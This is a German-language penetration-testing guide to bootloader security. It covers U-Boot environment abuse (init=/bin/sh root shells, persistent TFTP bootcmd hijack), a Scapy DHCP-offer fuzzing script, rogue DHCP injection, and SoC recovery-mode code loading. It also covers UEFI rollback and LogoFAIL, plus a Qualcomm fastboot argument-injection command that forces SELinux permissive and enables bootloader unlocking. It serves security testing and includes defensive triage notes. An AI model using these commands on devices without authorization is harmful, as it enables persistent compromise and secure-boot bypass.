# Bootloader-Tests

{{#include ../../banners/hacktricks-training.md}}

Die folgenden Schritte werden empfohlen, um Gerätestartkonfigurationen zu ändern und Bootloader wie U-Boot und UEFI-class loader zu testen. Konzentriere dich darauf, frühen Codeausführung zu erreichen, Signatur-/Rollback-Schutz zu bewerten und Wiederherstellungs- oder Network-Boot-Pfade auszunutzen.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot Quick Wins und Umgebungs-Abuse

1. Zugriff auf die Interpreter-Shell
- Während des Boots drücke eine bekannte Break-Taste (oft jede Taste, 0, Space oder eine platinen-spezifische "Magic"-Sequenz) bevor `bootcmd` ausgeführt wird, um in die U-Boot-Eingabeaufforderung zu gelangen.

2. Boot-Zustand und Variablen inspizieren
- Nützliche Befehle:
- `printenv` (Umgebung dumpen)
- `bdinfo` (Board-Info, Speicheradressen)
- `help bootm; help booti; help bootz` (unterstützte Kernel-Boot-Methoden)
- `help ext4load; help fatload; help tftpboot` (verfügbare Loader)

3. Boot-Argumente ändern, um eine Root-Shell zu bekommen
- Hänge `init=/bin/sh` an, sodass der Kernel eine Shell statt des normalen init startet:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot von deinem TFTP-Server
- Konfiguriere Netzwerk und lade einen Kernel/FIT-Image aus dem LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Änderungen über die Umgebung persistent machen
- Wenn der Env-Speicher nicht schreibgeschützt ist, kannst du Kontrolle persistent machen:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Prüfe Variablen wie `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets`, die Fallback-Pfade beeinflussen. Fehlkonfigurierte Werte können wiederholte Breaks in die Shell ermöglichen.

6. Debug-/unsichere Features prüfen
- Achte auf: `bootdelay` > 0, `autoboot` deaktiviert, uneingeschränktes `usb start; fatload usb 0:1 ...`, die Fähigkeit `loady`/`loads` über Serial zu verwenden, `env import` von untrusted media und Kernel/Ramdisks, die ohne Signaturprüfung geladen werden.

7. U-Boot Image/Verifikations-Tests
- Wenn die Plattform secure/verified boot mit FIT-Images behauptet, teste sowohl unsigned als auch manipulierte Images:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Fehlen `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` oder besteht ein legacy `verify=n` Verhalten, erlaubt dies oft das Booten beliebiger Payloads.

## Network-Boot-Angriffsfläche (DHCP/PXE) und Rogue-Server

8. PXE/DHCP-Parameter-Fuzzing
- U-Boots legacy BOOTP/DHCP-Handling hatte Speicher-Sicherheitsprobleme. Zum Beispiel beschreibt CVE‑2024‑42040 eine Speicher-Disclosure via manipulierte DHCP-Antworten, die bytes aus dem U-Boot-Speicher zurück on the wire leaken können. Teste die DHCP/PXE-Codepfade mit überlangen/Edge-Case-Werten (Option 67 bootfile-name, vendor options, file/servername-Felder) und beobachte Hänger/leaks.
- Minimaler Scapy-Snippet, um Boot-Parameter während Netboot zu stressen:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Prüfe außerdem, ob PXE-Dateiname-Felder ohne Sanitization an Shell/Loader-Logik weitergereicht werden, wenn sie an OS-seitige Provisioning-Skripte gekoppelt sind.

9. Rogue DHCP-Server Command-Injection-Tests
- Richte einen Rogue DHCP/PXE-Service ein und versuche, Zeichen in Filename- oder Options-Feldern zu injizieren, um später in der Bootkette Kommando-Interpreter zu erreichen. Metasploit’s DHCP auxiliary, `dnsmasq` oder custom Scapy-Skripte eignen sich gut. Isoliere zuerst das Labor-Netzwerk.

## SoC ROM-Recovery-Modi, die normalen Boot überschreiben

Viele SoCs bieten einen BootROM-"loader"-Modus, der Code über USB/UART akzeptiert, selbst wenn Flash-Images ungültig sind. Wenn secure-boot fuses nicht gebrannt sind, kann dies sehr früh in der Kette beliebige Codeausführung ermöglichen.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) oder `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Bewerte, ob das Gerät secure-boot eFuses/OTP gebrannt hat. Falls nicht, umgehen BootROM-Download-Modi häufig jede höherstufige Verifikation (U-Boot, Kernel, rootfs), indem dein First-Stage-Payload direkt aus SRAM/DRAM ausgeführt wird.

## UEFI/PC-class Bootloader: schnelle Checks

10. ESP-Manipulation und Rollback-Tests
- Mount die EFI System Partition (ESP) und prüfe auf Loader-Komponenten: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo-Pfade.
- Versuche, mit downgraded oder bekannten-vulnerablen signed Boot-Komponenten zu booten, falls Secure Boot revocations (dbx) nicht aktuell sind. Wenn die Plattform alte shims/bootmanagers noch vertraut, kannst du oft deinen eigenen Kernel oder `grub.cfg` von der ESP laden, um Persistenz zu erreichen.

11. Boot-Logo-Parsing-Bugs (LogoFAIL class)
- Mehrere OEM/IBV-Firmwares waren verwundbar gegenüber Image-Parsing-Fehlern in DXE, die Boot-Logos verarbeiten. Wenn ein Angreifer ein crafted Image auf der ESP unter einem vendor-spezifischen Pfad (z. B. `\EFI\<vendor>\logo\*.bmp`) ablegen kann und neu bootet, kann Codeausführung während des frühen Boots möglich sein, selbst mit aktiviertem Secure Boot. Teste, ob die Plattform user-supplied Logos akzeptiert und ob diese Pfade vom OS beschreibbar sind.

## Android/Qualcomm ABL + GBL (Android 16) Trust-Gaps

Auf Android-16-Geräten, die Qualcomms ABL verwenden, um die **Generic Bootloader Library (GBL)** zu laden, prüfe, ob ABL die UEFI-App, die es vom `efisp` lädt, **authentifiziert**. Wenn ABL lediglich das Vorhandensein einer UEFI-App **prüft** und Signaturen nicht verifiziert, wird eine Schreib-Primitive auf `efisp` zu **pre-OS unsigned code execution** beim Boot.

Praktische Checks und Abuse-Pfade:

- **efisp write primitive**: Du brauchst einen Weg, um eine benutzerdefinierte UEFI-App in `efisp` zu schreiben (root/privilegierter Service, OEM-App-Bug, recovery/fastboot-Pfad). Ohne diese ist die GBL-Lücke nicht direkt erreichbar.
- **fastboot OEM argument injection** (ABL-Bug): Manche Builds akzeptieren zusätzliche Tokens in `fastboot oem set-gpu-preemption` und hängen diese an die Kernel-cmdline an. Das kann benutzt werden, um permissive SELinux zu erzwingen und geschützte Partitionen schreibbar zu machen:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Wenn das Gerät gepatcht ist, sollte der Befehl zusätzliche Argumente ablehnen.
- **Bootloader-Unlock via persistente Flags**: Ein Boot-Stufe-Payload kann persistente Unlock-Flags setzen (z. B. `is_unlocked=1`, `is_unlocked_critical=1`), um `fastboot oem unlock` ohne OEM-Server/Approval-Gates zu emulieren. Dies ist eine dauerhafte Verhaltensänderung nach dem nächsten Reboot.

Defensive/Triage-Hinweise:

- Bestätige, ob ABL Signaturverifikation auf die GBL/UEFI-Payload aus `efisp` durchführt. Falls nicht, behandle `efisp` als hochriskante Persistenz-Oberfläche.
- Verfolge, ob ABL fastboot OEM-Handler gepatcht wurden, um **Argumentcounts zu validieren** und zusätzliche Tokens abzulehnen.

## Hardware-Hinweis

Sei vorsichtig beim Umgang mit SPI/NAND-Flash während des frühen Boots (z. B. Pins erden, um Reads zu umgehen) und konsultiere immer das Flash-Datasheet. Unsynchronisierte Shorts können das Gerät oder den Programmer corrupten.

## Hinweise und zusätzliche Tipps

- Versuche `env export -t ${loadaddr}` und `env import -t ${loadaddr}`, um Environment-Blobs zwischen RAM und Storage zu verschieben; einige Plattformen erlauben das Importieren von env von removable media ohne Authentifizierung.
- Für Persistenz auf Linux-basierten Systemen, die via `extlinux.conf` booten, reicht es oft, die `APPEND`-Zeile (um `init=/bin/sh` oder `rd.break` einzufügen) auf der Boot-Partition zu ändern, wenn keine Signaturprüfungen erzwungen werden.
- Wenn Userland `fw_printenv/fw_setenv` bereitstellt, verifiziere, dass `/etc/fw_env.config` mit dem echten Env-Speicher übereinstimmt. Fehlkonfigurierte Offsets erlauben es, die falsche MTD-Region zu lesen/schreiben.

## Referenzen

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
{{#include ../../banners/hacktricks-training.md}}
